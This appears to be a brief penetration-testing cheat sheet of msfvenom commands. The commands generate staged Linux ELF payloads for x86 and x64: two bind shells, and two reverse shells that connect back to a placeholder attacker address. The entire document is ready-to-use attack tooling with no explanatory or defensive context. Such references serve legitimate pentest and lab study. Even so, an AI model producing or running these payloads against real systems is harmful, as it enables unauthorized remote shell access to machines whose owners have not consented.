# Staged

## 01 - Bind Shells

- x86 (32-bit) Payloads

```
$ msfvenom -p linux/x86/shell/bind_tcp lport=<PORT> -f elf -o shell-x86
```

- x86-64 (64-bit) Payloads

```
$ msfvenom -p linux/x64/shell/bind_tcp lport=<PORT> -f elf -o shell-x86-64
```

## 02 - Reverse Shells

- x86 (32-bit) Payloads

```
$ msfvenom -p linux/x86/shell/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x86
```

- x86-64 (64-bit) Payloads

```
$ msfvenom -p linux/x64/shell/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x64
```